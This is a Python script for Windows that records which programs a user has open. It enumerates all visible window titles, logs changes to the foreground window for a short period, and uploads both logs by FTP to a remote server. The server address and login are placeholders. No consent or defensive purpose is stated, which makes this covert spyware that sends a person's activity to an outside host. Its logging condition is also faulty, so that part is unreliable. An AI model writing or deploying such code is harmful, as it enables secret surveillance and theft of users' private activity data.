import ctypes
import time
from ftplib import FTP
import logging

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
EnumWindows = ctypes.windll.user32.EnumWindows
EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_int), ctypes.POINTER(ctypes.c_int))
GetWindowText = ctypes.windll.user32.GetWindowTextW
GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
IsWindowVisible = ctypes.windll.user32.IsWindowVisible

titles = []

remotepath1 = "/files/windows_info_new.txt"
windows_info = './windows_info.txt'
main_window_info = './main_window_info_new.txt'
remotepath2 = "/files/main_window_info.txt"

logging.basicConfig(filename=main_window_info, level=logging.DEBUG)


def foreach_window(hwnd, lParam):
    if IsWindowVisible(hwnd):
        length = GetWindowTextLength(hwnd)
        buff = ctypes.create_unicode_buffer(length + 1)
        GetWindowText(hwnd, buff, length + 1)
        titles.append(buff.value)
    return True


def writefiles():
    EnumWindows(EnumWindowsProc(foreach_window), 0)
    # print(titles)

    global windows_info
    file_obj = open(windows_info, "w", encoding='utf-8')
    file_obj.write(str(time.asctime(time.localtime(time.time()))))
    file_obj.write('\n')
    file_obj.write("There are the programs you're using now!\n")
    for i in range(len(titles)):
        if titles[i] != '' and titles[i] != '\ue76c':  # \ue76c is Euro symbol
            file_obj.write(str(titles[i]))
            file_obj.write('\n')
            # print(titles[i])
    file_obj.close()


def ftp_connect():
    ftp = FTP()
    ftp.set_pasv(0)
    ftp.connect("xxx.xxx.xxx.xxx", 21)
    # ftp.connect("192.168.225.129", 21)
    ftp.login("xxxxx", "xxxxxxx")
    return ftp


def ftp_upload(ftp, filename, dstpath):

    fp = open(filename, 'rb')
    bufsize = 1024
    ftp.storbinary('STOR ' + dstpath, fp, bufsize)
    # ftp.set_debuglevel(0)
    fp.close()


def get_current_window():  # Function to grab the current window and its title

    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowTextLength = user32.GetWindowTextLengthW
    GetWindowText = user32.GetWindowTextW

    hwnd = GetForegroundWindow()  # Get handle to foreground window
    length = GetWindowTextLength(hwnd)  # Get length of the window text in title bar
    buff = ctypes.create_unicode_buffer(length + 1)  # Create buffer to store the window title buff
    GetWindowText(hwnd, buff, length + 1)  # Get window title and store in buff

    return buff.value


def main():
    global windows_info
    global remotepath1
    global main_window_info
    global remotepath2
    current_window = None

    writefiles()
    ftp = ftp_connect()
    ftp_upload(ftp, windows_info, remotepath1)
    begin_time = time.process_time()
    while True:
        end_time = time.process_time()
        if int(end_time - begin_time) > 100:
            break
        if current_window != get_current_window():
            current_window = get_current_window()
            if not current_window:
                logging.info(time.asctime(time.localtime(time.time())) + '\n You are using:\t' + current_window + '\n')
    ftp_upload(ftp, main_window_info, remotepath2)
    ftp.quit()


if __name__ == "__main__":
    main()
